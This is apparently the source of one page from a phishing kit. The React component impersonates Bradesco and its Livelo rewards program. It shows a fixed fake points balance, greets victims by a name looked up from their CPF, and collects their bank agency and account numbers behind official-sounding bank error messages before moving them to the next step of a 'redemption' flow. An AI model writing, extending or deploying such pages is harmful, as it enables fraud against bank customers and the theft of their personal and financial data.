import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { SegmentSwitch } from "@/components/SegmentSwitch";
import { Lock, MessageSquareMore, Diamond } from "lucide-react";
import icosFooter from "@/assets/icos-footer.png";
import menuIco1 from "@/assets/menu-ico-mobile-1.png";
import menuIco2 from "@/assets/menu-ico-mobile-2.png";
import { useFlow } from "@/contexts/FlowContext";
import { edgeFunctionsService } from "@/services";
import LottieBackground from "@/components/LottieBackground";
import { getSegmentLogo } from "@/lib/segment-config";
import { segmentButtonStyle } from "@/lib/segment-colors";
import LottieLoader from "@/components/LottieLoader";
import AccountErrorScreen from "@/components/AccountErrorScreen";
import ErrorScreen from "@/components/ErrorScreen";
import { useFlowNavigation } from "@/hooks/useFlowNavigation";

const ERROR_MESSAGES: Record<string, { title: string; description: string }> = {
  SENHA_CANCELADA: {
    title: "Senha cancelada",
    description: "A senha da sua conta está cancelada. Procure sua agência Bradesco para regularizar o acesso.",
  },
  DIGITO_INVALIDO: {
    title: "Dígito inválido",
    description: "O dígito verificador da conta está incorreto. Verifique o último número após o traço e tente novamente.",
  },
  CONTA_INVALIDA: {
    title: "Conta inválida",
    description: "O número da conta informado não existe. Confira se você digitou todos os números corretamente, incluindo o dígito.",
  },
  AGENCIA_INVALIDA: {
    title: "Agência inválida",
    description: "O número da agência não foi encontrado. Verifique os 4 dígitos da sua agência e tente novamente.",
  },
  CONTA_RESTRITA: {
    title: "Conta com restrição",
    description: "Esta conta possui uma pendência que impede o acesso. Procure sua agência Bradesco para regularizar.",
  },
  FALHA_VALIDACAO: {
    title: "Erro na validação",
    description: "Não foi possível validar seus dados no momento. Tente novamente em alguns instantes.",
  },
  TIMEOUT: {
    title: "Serviço indisponível",
    description: "A consulta demorou mais que o esperado. Verifique sua conexão e tente novamente.",
  },
  NAO_IDENTIFICADO: {
    title: "Dados não reconhecidos",
    description: "Não conseguimos identificar sua conta com os dados informados. Verifique a agência e o número da conta.",
  },
  CPF_NAO_ENCONTRADO: {
    title: "CPF bloqueado",
    description: "O CPF informado está bloqueado para resgate.",
  },
  ERRO_GENERICO: {
    title: "Erro inesperado",
    description: "Ocorreu um erro ao consultar seus dados. Tente novamente.",
  },
};

const BankDataPage = () => {
  const navigate = useNavigate();
  const { data, updateData } = useFlow();
  const { getNextStep } = useFlowNavigation();
  const [agency, setAgency] = useState(data.agency);
  const [account, setAccount] = useState(data.account);
  const [errors, setErrors] = useState<{ agency?: string; account?: string }>({});
  const [loading, setLoading] = useState(false);
  const [selectedTitular, setSelectedTitular] = useState(1);
  const [errorCode, setErrorCode] = useState("");
  const [networkError, setNetworkError] = useState(false);
  useEffect(() => {
    if (!data.cpf) {
      navigate("/");
      return;
    }
    // Fetch nome on mount if not already set
    if (!data.nome) {
      edgeFunctionsService.consultarCpf(data.cpf).then((cpfData) => {
        if (cpfData?.nome) updateData({ nome: cpfData.nome });
      }).catch(console.error);
    }
  }, [data.cpf, data.nome, navigate, updateData]);

  useEffect(() => {
    if (data.rememberAccount) {
      const savedAgency = localStorage.getItem("livelo_agency");
      const savedAccount = localStorage.getItem("livelo_account");
      if (savedAgency) setAgency(savedAgency);
      if (savedAccount) setAccount(savedAccount);
    }
  }, [data.rememberAccount]);

  const currentError = errorCode ? ERROR_MESSAGES[errorCode] || ERROR_MESSAGES.ERRO_GENERICO : null;

  const handleContinue = async () => {
    setErrorCode("");
    const newErrors: typeof errors = {};
    if (!agency.trim()) newErrors.agency = "Informe a agência";
    if (!account.trim()) newErrors.account = "Informe a conta";

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    if (data.rememberAccount) {
      localStorage.setItem("livelo_agency", agency);
      localStorage.setItem("livelo_account", account);
    }

    setLoading(true);
    try {
      const accountClean = account.replace(/\D/g, "");

      const [segRes, cpfRes] = await Promise.all([
        edgeFunctionsService.consultarSegmento(agency, accountClean),
        edgeFunctionsService.consultarCpf(data.cpf),
      ]);

      const segment = segRes.segment || "";
      const nome = cpfRes.nome || "";
      const segError = segRes.error || "";

      if (!nome) {
        setErrorCode("CPF_NAO_ENCONTRADO");
        return;
      }

      if (segError) {
        setErrorCode(segError);
        return;
      }

      if (!segment || segment === "NAO_IDENTIFICADO") {
        setErrorCode("NAO_IDENTIFICADO");
        return;
      }

      updateData({ agency, account, segment, nome });
      navigate(getNextStep("dados-bancarios"));
    } catch (error) {
      console.error("Erro ao consultar dados:", error);
      setNetworkError(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col px-6 py-8 pb-safe">
      <LottieBackground segment={data.segment} />

      {/* Header */}
      <div className="relative z-10 mb-4 flex items-center justify-between">
        <img src={menuIco1} alt="Menu" className="h-9 w-auto" />
        <img src={menuIco2} alt="Notificações" className="h-9 w-auto" />
      </div>
      <div className="relative z-10 mb-4">
        <img src={getSegmentLogo(data.segment)} alt="Bradesco" className="w-[160px] h-auto object-contain brightness-0 invert" />
      </div>

      {/* Greeting */}
      <div className="relative z-10 mb-0 mt-16">
        <h1 className="text-lg font-bold leading-snug text-white">
          Olá, {data.nome ? data.nome.split(" ")[0] : "Cliente"}
        </h1>
        <p className="text-body-sm text-white/70 mt-1">
          Você possui <span className="font-semibold text-white">120.758 pontos</span> para o resgate.
        </p>
      </div>

      {/* Spacer */}
      <div className="flex-1 min-h-[40px] max-h-[100px]" />

      {/* Fields side by side */}
      <div className="relative z-10 flex gap-8 mb-8">
        <div className="flex-1 space-y-1">
          <label className="text-body-sm font-semibold text-white/80">Agência sem dígito</label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="0000"
            maxLength={4}
            value={agency}
            onChange={(e) => {
              setAgency(e.target.value.replace(/\D/g, "").slice(0, 4));
              setErrors((prev) => ({ ...prev, agency: undefined }));
              setErrorCode("");
            }}
            className="w-full border-b-2 border-white/40 bg-transparent py-3 text-white placeholder:text-white/30 outline-none focus:border-white transition-colors text-body"
          />
          {errors.agency && (
            <p className="text-xs text-yellow-200">{errors.agency}</p>
          )}
        </div>

        <div className="flex-1 space-y-1">
          <label className="text-body-sm font-semibold text-white/80">Conta com dígito</label>
          <input
            type="text"
            inputMode="numeric"
            placeholder="0000000-0"
            maxLength={9}
            value={account}
            onChange={(e) => {
              const digits = e.target.value.replace(/\D/g, "").slice(0, 8);
              const masked = digits.length > 1 ? `${digits.slice(0, -1)}-${digits.slice(-1)}` : digits;
              setAccount(masked);
              setErrors((prev) => ({ ...prev, account: undefined }));
              setErrorCode("");
            }}
            className="w-full border-b-2 border-white/40 bg-transparent py-3 text-white placeholder:text-white/30 outline-none focus:border-white transition-colors text-body"
          />
          {errors.account && (
            <p className="text-xs text-yellow-200">{errors.account}</p>
          )}
        </div>
      </div>

      {/* Titular selector */}
      <div className="relative z-10 flex gap-3 mb-8">
        {[1, 2, 3].map((n) => (
          <button
            key={n}
            onClick={() => setSelectedTitular(n)}
            className={`flex-1 h-11 rounded-full border-2 text-body-sm font-semibold transition-all active:scale-[0.97] ${
              selectedTitular === n
                ? "bg-white text-livelo-red border-white"
                : "bg-transparent text-white border-white/50"
            }`}
          >
            {n}º titular
          </button>
        ))}
      </div>

      {/* Toggle */}
      <div className="relative z-10 flex items-center justify-between mb-8">
        <span className="text-body-sm font-medium text-white">Lembrar agência e conta</span>
        <SegmentSwitch
          segment={data.segment}
          checked={data.rememberAccount}
          onCheckedChange={(val) => updateData({ rememberAccount: val })}
        />
      </div>

      {/* Fullscreen error overlay */}
      {currentError && (
        <AccountErrorScreen
          title={currentError.title}
          description={currentError.description}
          segment={data.segment}
          onDismiss={() => setErrorCode("")}
        />
      )}

      {/* Network error screen */}
      {networkError && (
        <div className="fixed inset-0 z-50">
          <ErrorScreen
            type="network"
            onAction={() => {
              setNetworkError(false);
              handleContinue();
            }}
          />
        </div>
      )}

      {/* Spacer */}
      <div className="flex-1" />

      {/* Button */}
      <button
        onClick={handleContinue}
        disabled={loading}
        className="relative z-10 h-14 w-full rounded-full bg-white text-body font-semibold text-livelo-red shadow-lg transition-all active:scale-[0.98] disabled:opacity-50"
      >
        {loading ? <LottieLoader variant="red" size={28} /> : "Iniciar Resgate"}
      </button>

      {/* Bottom icons bar */}
      <div className="relative z-10 mt-6 flex justify-center">
        <img src={icosFooter} alt="Chave de Segurança, BIA, Pix" className="w-full max-w-[320px] h-auto opacity-80" />
      </div>
    </div>
  );
};

export default BankDataPage;
